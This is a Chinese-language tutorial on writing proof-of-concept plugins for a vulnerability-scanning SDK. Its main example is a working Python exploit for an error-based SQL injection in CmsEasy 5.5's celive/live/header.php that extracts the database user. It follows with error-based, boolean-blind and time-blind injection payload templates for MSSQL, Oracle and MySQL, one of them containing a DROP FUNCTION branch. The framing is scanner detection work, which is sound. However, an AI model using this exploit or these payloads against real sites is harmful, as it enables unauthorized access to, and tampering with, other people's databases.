CmsEasy 5.5 UTF-8 20140802/celive/live/header.php SQL注入漏洞

先来浏览器构造测试：

使用POC:

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib


def assign(service, arg):
    if service == fingerprint.cmseasy:
        return True, arg


def audit(arg):
    target = arg + 'celive/live/header.php'
    post_data = {
        'xajax': 'LiveMessage',
        'xajaxargs[0][name]': "1',(SELECT 1 FROM (select count(*),concat("
                              "floor(rand(0)*2),(select user()))a from "
                              "information_schema.tables group by a)b),"
                              "'','','','1','127.0.0.1','2') #"
    }
    code, head, body, redirect_url, log = hackhttp.http(
        target, post=urllib.urlencode(post_data))
    print code,body

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.cmseasy, 'http://ip/')[1])

简单说下这个代码都做了什么操作。

以discuz举例:

1.先导入需要的标准库。

2.assign传入待测地址。

3.assign函数通过指纹判断。

4.满足3的基础之上，audit中进行payload的构造以及进行回显的判断。

那么有人有疑问了，为什么要用到两个函数。

assign函数

事实上，SDK中封装了两个基本函数，assign函数在判断完传入的服务类型之后，会传入arg到审计函数audit中。

assign存在的意义就在于可以避免不必要的测试。比如你期望用dedecms的poc去验证wordpress的站点，明显是不合理的。

audit函数

这个函数是审计函数，漏洞检测的发送已经响应报文是这个函数体现的。如果逻辑较为复杂，大家可以自行封装方法，最后在audit函数调用即可。

就如POC中那样，最后构造的select查询语句在audit中体现。

那么有人问了，如果遇到其他的数据库该怎么构造。

报错注入构造

以提供poc检测精准度为准。提供一个样例:

MSSQL 数据库

select sys.fn_varbintohexstr(hashbytes('MD5','1234'));

Oracle 数据库

SELECT CHR(97)||CHR(108)||CHR(107)||CHR(100)||CHR(102)||CHR(106)||CHR(103)||CHR(99) FROM foobar

MySQL 数据库

select md5(233);

布尔盲注构造

这一类的注入在返回页面中没有回显，但可以根据返回页面的结果判断构造的SQL条件语句的真假性。

MSSQL 数据库

select * from xxxx where id=xxx and 1=1;
select * from xxxx where id=xxx and 1=2;
IF(1=1) SELECT 123 ELSE DROP FUNCTION xxxx;

Oracle 数据库

(SELECT (CASE WHEN (1=1) THEN 123 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)

MySQL 数据库

select * from table where 1=1;
select * from table where 1=2;
select * from table where 1>2;
select IF(1=1, 1, 2);
select IF(1=2, 1, 2);
select IF('a'='a', 1, 2);

时间盲注构造

这一类的注入在返回页面中没有回显，但可以根据返回页面的结果判断构造的SQL条件语句的真假性。当天如果为了提高准确率，可以将结果保存，多测试几次。

MSSQL 数据库

waitfor delay '0:0:5'

MySQL 数据库

SELECT IF(1=1, sleep(5), "1");
SELECT IF(1=2, sleep(5), "1");
